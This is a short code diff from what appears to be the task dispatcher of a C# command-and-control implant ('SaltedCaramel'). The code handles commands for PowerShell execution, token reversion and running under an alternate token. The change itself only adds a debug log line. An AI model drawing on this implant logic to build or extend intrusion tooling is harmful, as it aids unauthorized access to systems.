@@ -66,7 +66,10 @@ namespace SaltedCaramel
                 Powershell.Execute(this, implant);
             }
             else if (this.command == "rev2self")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to revert token");
                 Token.Revert();
+            }
             else if (this.command == "run")
             {
                 if (implant.hasAlternateToken() == true)
